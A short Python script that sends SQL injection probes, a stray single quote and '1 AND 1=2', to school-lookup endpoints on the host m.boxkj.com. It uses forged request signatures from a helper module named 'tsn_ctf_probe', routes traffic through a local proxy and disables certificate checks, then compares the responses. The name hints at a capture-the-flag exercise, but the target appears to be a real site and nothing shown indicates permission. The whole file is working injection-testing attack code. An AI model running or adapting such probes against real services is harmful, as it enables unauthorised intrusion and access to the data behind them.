import sys, ssl, gzip, urllib.request
sys.path.insert(0,'/Users/mac/Desktop')
from tsn_ctf_probe import build_signed, form_body, base_headers
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.ProxyHandler({'http':'http://127.0.0.1:7897','https':'http://127.0.0.1:7897'}), urllib.request.HTTPSHandler(context=ctx))
def post(path, params):
    body,concat,sign=build_signed(params)
    req=urllib.request.Request('https://m.boxkj.com'+path, data=form_body(body), headers=base_headers(), method='POST')
    try:
        with opener.open(req,timeout=20) as r:
            d=r.read()
            if 'gzip' in (r.headers.get('Content-Encoding') or '').lower(): d=gzip.decompress(d)
            return r.status, d.decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        d=e.read()
        if 'gzip' in (e.headers.get('Content-Encoding') or '').lower(): d=gzip.decompress(d)
        return e.code, d.decode('utf-8','replace')
for path,params in [
    ('/app/sch/listSchoolByProvinceId', {'provinceId':'1'}),
    ('/app/sch/listSchoolByProvinceId', {'provinceId':"1'"}),
    ('/app/sch/listSchoolByProvinceId', {'provinceId':"1 AND 1=2"}),
    ('/app/sch/getSchoolById', {'schoolId':"1'"}),
]:
    st,txt=post(path,params)
    print(f'[{path}] {params} -> HTTP {st} len={len(txt)} | {txt[:220]}')
